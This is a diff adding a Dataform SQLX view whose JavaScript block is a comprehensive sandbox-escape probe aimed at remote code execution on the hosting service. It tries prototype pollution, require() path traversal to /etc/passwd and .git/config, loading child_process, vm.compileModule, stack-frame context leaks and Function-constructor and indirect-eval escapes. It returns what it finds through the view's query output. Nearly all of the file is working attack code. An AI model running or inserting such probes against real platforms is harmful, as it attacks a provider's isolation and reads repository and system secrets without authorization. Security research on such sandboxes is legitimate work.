@@ -1,0 +1,261 @@
+-- Comprehensive V8 Sandbox Probe
+-- Tests write capability, globalThis, all APIs for RCE vectors
+
+config {
+  type: "view",
+  name: "comprehensive_sandbox_probe"
+}
+
+js {
+  let r = [];
+
+  // ============================================
+  // SECTION 1: restricted_fs WRITE CAPABILITY
+  // ============================================
+
+  // 1.1: Enumerate ALL restricted_fs methods
+  try {
+    const ownKeys = Object.keys(restricted_fs);
+    const protoKeys = Object.getOwnPropertyNames(Object.getPrototypeOf(restricted_fs) || {});
+    r.push('1.1_fs_own: ' + ownKeys.join(','));
+    r.push('1.1_fs_proto: ' + protoKeys.join(','));
+  } catch(e) { r.push('1.1_err: ' + e.message); }
+
+  // 1.2: Check for write methods
+  const writeMethods = [
+    'writeFile', 'writeFileSync', 'appendFile', 'appendFileSync',
+    'createWriteStream', 'open', 'openSync', 'write', 'writeSync',
+    'unlink', 'unlinkSync', 'mkdir', 'mkdirSync', 'rmdir', 'rmdirSync',
+    'rename', 'renameSync', 'copyFile', 'copyFileSync', 'link', 'linkSync',
+    'symlink', 'symlinkSync', 'chmod', 'chmodSync', 'chown', 'chownSync',
+    'truncate', 'truncateSync', 'utimes', 'utimesSync'
+  ];
+  for (const m of writeMethods) {
+    r.push('1.2_fs.' + m + ': ' + typeof restricted_fs[m]);
+  }
+
+  // 1.3: Try to add writeFile via prototype pollution
+  try {
+    const origProto = Object.getPrototypeOf(restricted_fs);
+    if (origProto) {
+      origProto.writeFile = function(p, d) { return 'polluted'; };
+      r.push('1.3_proto_pollution: ' + (typeof restricted_fs.writeFile));
+      delete origProto.writeFile; // cleanup
+    } else {
+      r.push('1.3_proto_pollution: no_proto');
+    }
+  } catch(e) { r.push('1.3_proto_err: ' + e.message.substring(0,50)); }
+
+  // 1.4: Check if restricted_fs is frozen/sealed
+  try {
+    r.push('1.4_fs_frozen: ' + Object.isFrozen(restricted_fs));
+    r.push('1.4_fs_sealed: ' + Object.isSealed(restricted_fs));
+    r.push('1.4_fs_extensible: ' + Object.isExtensible(restricted_fs));
+  } catch(e) { r.push('1.4_err: ' + e.message); }
+
+  // ============================================
+  // SECTION 2: GLOBALTHIS ENUMERATION
+  // ============================================
+
+  // 2.1: All global property names
+  try {
+    const globals = Object.getOwnPropertyNames(globalThis);
+    r.push('2.1_globalThis: ' + globals.join(','));
+  } catch(e) { r.push('2.1_err: ' + e.message); }
+
+  // 2.2: Check for known interesting globals
+  const interestingGlobals = [
+    'process', 'require', 'module', 'exports', '__dirname', '__filename',
+    'Buffer', 'console', 'setTimeout', 'setInterval', 'setImmediate',
+    'fetch', 'XMLHttpRequest', 'WebSocket',
+    'restricted_fs', 'vm', 'core', 'Dataform', 'dataform',
+    'session', 'context', 'env', 'runtime', 'self', 'window', 'document',
+    '_internalError', 'InternalError', 'global', 'GLOBAL', 'root'
+  ];
+  for (const name of interestingGlobals) {
+    try {
+      const val = eval(name);
+      const typ = typeof val;
+      const keys = (val && typ === 'object') ? Object.keys(val).slice(0,15).join(',') : '';
+      r.push('2.2_' + name + ': ' + typ + (keys ? ' [' + keys + ']' : ''));
+    } catch(e) {
+      r.push('2.2_' + name + ': undefined');
+    }
+  }
+
+  // ============================================
+  // SECTION 3: require() INTERNALS
+  // ============================================
+
+  // 3.1: require properties
+  try {
+    const reqKeys = Object.keys(require);
+    r.push('3.1_require_keys: ' + reqKeys.join(','));
+    r.push('3.1_require.cache: ' + typeof require.cache);
+    r.push('3.1_require.resolve: ' + typeof require.resolve);
+    r.push('3.1_require.main: ' + typeof require.main);
+    r.push('3.1_require.extensions: ' + typeof require.extensions);
+  } catch(e) { r.push('3.1_err: ' + e.message); }
+
+  // 3.2: Try require path traversal
+  const requirePaths = [
+    '../.git/config',
+    '../../.git/config',
+    '../../../.git/config',
+    '/etc/passwd',
+    'fs', 'child_process', 'http', 'net', 'os',
+    '@dataform/core'
+  ];
+  for (const p of requirePaths) {
+    try {
+      const result = require(p);
+      r.push('3.2_require(' + p + '): ' + typeof result);
+    } catch(e) {
+      r.push('3.2_require(' + p + '): ' + e.message.substring(0,40));
+    }
+  }
+
+  // ============================================
+  // SECTION 4: DATAFORM/CORE OBJECTS
+  // ============================================
+
+  // 4.1: Enumerate 'core' object deeply
+  try {
+    const coreKeys = Object.keys(core);
+    r.push('4.1_core_keys: ' + coreKeys.join(','));
+    for (const k of coreKeys.slice(0,10)) {
+      const v = core[k];
+      r.push('4.1_core.' + k + ': ' + typeof v);
+    }
+  } catch(e) { r.push('4.1_err: ' + e.message); }
+
+  // 4.2: Check for Dataform class
+  try {
+    if (typeof Dataform !== 'undefined') {
+      r.push('4.2_Dataform: ' + typeof Dataform);
+      r.push('4.2_Dataform_keys: ' + Object.keys(Dataform).join(','));
+    }
+  } catch(e) { r.push('4.2_err: ' + e.message); }
+
+  // ============================================
+  // SECTION 5: VM OBJECT
+  // ============================================
+
+  // 5.1: Enumerate vm methods
+  try {
+    const vmKeys = Object.keys(vm);
+    r.push('5.1_vm_keys: ' + vmKeys.join(','));
+    for (const k of vmKeys) {
+      r.push('5.1_vm.' + k + ': ' + typeof vm[k]);
+    }
+  } catch(e) { r.push('5.1_err: ' + e.message); }
+
+  // 5.2: Try vm.compileModule to access host context
+  try {
+    const compiled = vm.compileModule('return typeof process !== "undefined" ? process : "blocked"');
+    if (compiled) {
+      r.push('5.2_vm_compile: ' + (typeof compiled));
+      r.push('5.2_vm_result: ' + compiled());
+    }
+  } catch(e) { r.push('5.2_err: ' + e.message.substring(0,50)); }
+
+  // ============================================
+  // SECTION 6: ERROR.PREPARESTACKTRACE
+  // ============================================
+
+  // 6.1: Try to leak host context via stack frames
+  try {
+    let leaked = [];
+    const origPrepare = Error.prepareStackTrace;
+    Error.prepareStackTrace = (err, stack) => {
+      stack.forEach((frame, i) => {
+        const thisObj = frame.getThis();
+        leaked.push({
+          i: i,
+          fn: frame.getFunctionName(),
+          file: frame.getFileName(),
+          thisType: typeof thisObj,
+          thisKeys: thisObj ? Object.keys(thisObj).slice(0,10) : null
+        });
+      });
+      return 'captured';
+    };
+    new Error('test').stack;
+    Error.prepareStackTrace = origPrepare;
+    r.push('6.1_stack_frames: ' + JSON.stringify(leaked).substring(0,300));
+  } catch(e) { r.push('6.1_err: ' + e.message); }
+
+  // ============================================
+  // SECTION 7: FUNCTION CONSTRUCTOR ESCAPE
+  // ============================================
+
+  // 7.1: Try Function constructor to access global
+  try {
+    const Fn = Function.constructor;
+    const escape = new Fn('return this')();
+    const escapeKeys = Object.keys(escape || {}).slice(0,20);
+    r.push('7.1_fn_escape: ' + escapeKeys.join(','));
+  } catch(e) { r.push('7.1_err: ' + e.message.substring(0,50)); }
+
+  // 7.2: Indirect eval
+  try {
+    const indirectEval = (0, eval);
+    const result = indirectEval('this');
+    r.push('7.2_indirect_eval: ' + Object.keys(result || {}).slice(0,10).join(','));
+  } catch(e) { r.push('7.2_err: ' + e.message); }
+
+  // ============================================
+  // SECTION 8: .git/config ACCESS
+  // ============================================
+
+  // 8.1: Try to read .git/config
+  try {
+    const gitConfig = restricted_fs.readFile('.git/config');
+    r.push('8.1_git_config: ' + (gitConfig ? gitConfig.substring(0,200) : 'null'));
+  } catch(e) { r.push('8.1_err: ' + e.message); }
+
+  // 8.2: Try to read .git/HEAD
+  try {
+    const gitHead = restricted_fs.readFile('.git/HEAD');
+    r.push('8.2_git_head: ' + (gitHead ? gitHead.substring(0,100) : 'null'));
+  } catch(e) { r.push('8.2_err: ' + e.message); }
+
+  // 8.3: Check if .git is a file (gitdir: pointer)
+  try {
+    const isGitDir = restricted_fs.isDirectory('.git');
+    r.push('8.3_git_isdir: ' + isGitDir);
+  } catch(e) { r.push('8.3_err: ' + e.message); }
+
+  // ============================================
+  // SECTION 9: WASM CAPABILITIES
+  // ============================================
+
+  // 9.1: Check WebAssembly
+  try {
+    r.push('9.1_wasm: ' + (typeof WebAssembly));
+    if (typeof WebAssembly !== 'undefined') {
+      r.push('9.1_wasm_keys: ' + Object.keys(WebAssembly).join(','));
+    }
+  } catch(e) { r.push('9.1_err: ' + e.message); }
+
+  // ============================================
+  // SECTION 10: SYMBOLS & HIDDEN PROPERTIES
+  // ============================================
+
+  // 10.1: Check for Symbol properties on globalThis
+  try {
+    const symbols = Object.getOwnPropertySymbols(globalThis);
+    r.push('10.1_global_symbols: ' + symbols.length);
+    for (const sym of symbols.slice(0,5)) {
+      r.push('10.1_sym: ' + sym.toString());
+    }
+  } catch(e) { r.push('10.1_err: ' + e.message); }
+
+  // 10.2: Check for hidden properties on restricted_fs
+  try {
+    const fsSymbols = Object.getOwnPropertySymbols(restricted_fs);
+    r.push('10.2_fs_symbols: ' + fsSymbols.length);
+  } catch(e) { r.push('10.2_err: ' + e.message); }
+}
+
+SELECT '${JSON.stringify(r)}' as probe_results
